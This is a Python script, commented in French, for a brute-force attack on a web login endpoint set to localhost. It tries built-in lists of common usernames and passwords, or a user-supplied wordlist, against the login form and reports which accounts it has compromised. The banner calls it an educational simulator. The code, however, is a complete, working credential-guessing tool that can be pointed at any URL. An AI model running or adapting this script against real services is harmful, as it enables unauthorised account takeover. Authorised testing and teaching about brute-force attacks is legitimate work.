#!/usr/bin/env python3
"""
Attaque Brute Force sur le système de login
Teste différentes combinaisons username/password
"""

import requests
import time
from colorama import Fore, Style, init
from tqdm import tqdm

init(autoreset=True)

# Configuration
TARGET_URL = "http://localhost/login"
DELAY_BETWEEN_ATTEMPTS = 0.1  # secondes (pour éviter de trop surcharger)

# Liste de mots de passe courants
COMMON_PASSWORDS = [
    "password", "123456", "12345678", "admin", "password123",
    "root", "test", "pass", "1234", "qwerty",
    "abc123", "letmein", "monkey", "dragon", "master",
    "welcome", "login", "admin123", "root123", "password1",
    "123", "Pass123", "admin1", "test123", "user",
    "caca", "azerty", "soleil", "marseille", "doudou","pipi"
]

COMMON_USERNAMES = [
    "admin", "root", "user", "test", "administrator",
    "guest", "demo", "superadmin", "moderator", "testuser",
    "pipi"
]


def banner():
    print(f"""
{Fore.RED}╔═══════════════════════════════════════════════════╗
║        🔨 BRUTE FORCE ATTACK SIMULATOR           ║
║              POUR TESTS PÉDAGOGIQUES              ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
""")


def test_login(username, password):
    """Teste une combinaison username/password"""
    try:
        response = requests.post(
            TARGET_URL,
            json={"username": username, "password": password},
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return True, data.get('message', 'Succès')
        return False, response.json().get('message', 'Échec')
    
    except requests.exceptions.RequestException as e:
        return False, f"Erreur réseau: {str(e)}"


def brute_force_single_user(username):
    """Attaque brute force sur un utilisateur spécifique"""
    print(f"\n{Fore.CYAN}[*] Démarrage attaque sur l'utilisateur: {username}{Style.RESET_ALL}")
    print(f"[*] Nombre de mots de passe à tester: {len(COMMON_PASSWORDS)}")
    print(f"[*] URL cible: {TARGET_URL}\n")
    
    start_time = time.time()
    attempts = 0
    
    for password in tqdm(COMMON_PASSWORDS, desc="Tentatives", colour="red"):
        attempts += 1
        success, message = test_login(username, password)
        
        if success:
            elapsed = time.time() - start_time
            print(f"\n{Fore.GREEN}[✓] SUCCÈS !")
            print(f"[✓] Username: {username}")
            print(f"[✓] Password: {password}")
            print(f"[✓] Tentatives: {attempts}")
            print(f"[✓] Temps écoulé: {elapsed:.2f}s{Style.RESET_ALL}")
            return True, username, password, attempts
        
        time.sleep(DELAY_BETWEEN_ATTEMPTS)
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.YELLOW}[!] Aucun mot de passe trouvé pour {username}")
    print(f"[!] {attempts} tentatives en {elapsed:.2f}s{Style.RESET_ALL}")
    return False, username, None, attempts


def brute_force_multiple_users():
    """Attaque brute force sur plusieurs utilisateurs"""
    print(f"\n{Fore.CYAN}[*] Démarrage attaque multi-utilisateurs")
    print(f"[*] Nombre d'utilisateurs: {len(COMMON_USERNAMES)}")
    print(f"[*] Mots de passe par utilisateur: {len(COMMON_PASSWORDS)}{Style.RESET_ALL}\n")
    
    results = []
    total_start = time.time()
    total_attempts = 0
    
    for username in COMMON_USERNAMES:
        success, user, pwd, attempts = brute_force_single_user(username)
        total_attempts += attempts
        
        if success:
            results.append({
                'username': user,
                'password': pwd,
                'attempts': attempts,
                'success': True
            })
        else:
            results.append({
                'username': user,
                'password': None,
                'attempts': attempts,
                'success': False
            })
    
    total_elapsed = time.time() - total_start
    
    # Rapport final
    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
    print(f"║              📊 RAPPORT D'ATTAQUE                 ║")
    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Statistiques globales:")
    print(f"  • Utilisateurs testés: {len(COMMON_USERNAMES)}")
    print(f"  • Tentatives totales: {total_attempts}")
    print(f"  • Temps total: {total_elapsed:.2f}s")
    print(f"  • Vitesse: {total_attempts/total_elapsed:.2f} tentatives/s{Style.RESET_ALL}")
    
    success_count = sum(1 for r in results if r['success'])
    
    print(f"\n{Fore.GREEN}Comptes compromis: {success_count}/{len(COMMON_USERNAMES)}{Style.RESET_ALL}")
    
    for result in results:
        if result['success']:
            print(f"  {Fore.GREEN}✓ {result['username']} : {result['password']}{Style.RESET_ALL}")
    
    failed_count = len(COMMON_USERNAMES) - success_count
    if failed_count > 0:
        print(f"\n{Fore.YELLOW}Comptes non compromis: {failed_count}{Style.RESET_ALL}")
        for result in results:
            if not result['success']:
                print(f"  {Fore.YELLOW}✗ {result['username']}{Style.RESET_ALL}")


def custom_attack():
    """Attaque personnalisée avec username et wordlist"""
    print(f"\n{Fore.CYAN}[*] Mode attaque personnalisée{Style.RESET_ALL}")
    
    username = input(f"{Fore.WHITE}Username cible: {Style.RESET_ALL}")
    
    print(f"\n{Fore.WHITE}Choisissez une option:")
    print("1. Utiliser la liste de mots de passe par défaut")
    print("2. Charger un fichier wordlist{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.WHITE}Choix (1/2): {Style.RESET_ALL}")
    
    if choice == "2":
        wordlist_path = input(f"{Fore.WHITE}Chemin du fichier wordlist: {Style.RESET_ALL}")
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[✓] {len(passwords)} mots de passe chargés{Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.RED}[✗] Fichier introuvable, utilisation de la liste par défaut{Style.RESET_ALL}")
            passwords = COMMON_PASSWORDS
    else:
        passwords = COMMON_PASSWORDS
    
    # Attaque
    print(f"\n{Fore.CYAN}[*] Lancement de l'attaque...{Style.RESET_ALL}")
    start_time = time.time()
    attempts = 0
    
    for password in tqdm(passwords, desc="Tentatives", colour="red"):
        attempts += 1
        success, message = test_login(username, password)
        
        if success:
            elapsed = time.time() - start_time
            print(f"\n{Fore.GREEN}[✓] SUCCÈS !")
            print(f"[✓] Username: {username}")
            print(f"[✓] Password: {password}")
            print(f"[✓] Tentatives: {attempts}/{len(passwords)}")
            print(f"[✓] Temps: {elapsed:.2f}s{Style.RESET_ALL}")
            return
        
        time.sleep(DELAY_BETWEEN_ATTEMPTS)
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.YELLOW}[!] Mot de passe non trouvé")
    print(f"[!] {attempts} tentatives en {elapsed:.2f}s{Style.RESET_ALL}")


def main():
    banner()
    
    print(f"{Fore.WHITE}Sélectionnez le mode d'attaque:")
    print("1. Attaque sur un utilisateur spécifique (avec liste par défaut)")
    print("2. Attaque sur plusieurs utilisateurs")
    print("3. Attaque personnalisée (avec wordlist)")
    print("4. Quitter{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.CYAN}Votre choix (1-4): {Style.RESET_ALL}")
    
    if choice == "1":
        username = input(f"\n{Fore.WHITE}Username cible: {Style.RESET_ALL}")
        brute_force_single_user(username)
    
    elif choice == "2":
        brute_force_multiple_users()
    
    elif choice == "3":
        custom_attack()
    
    elif choice == "4":
        print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
        return
    
    else:
        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attaque interrompue par l'utilisateur{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")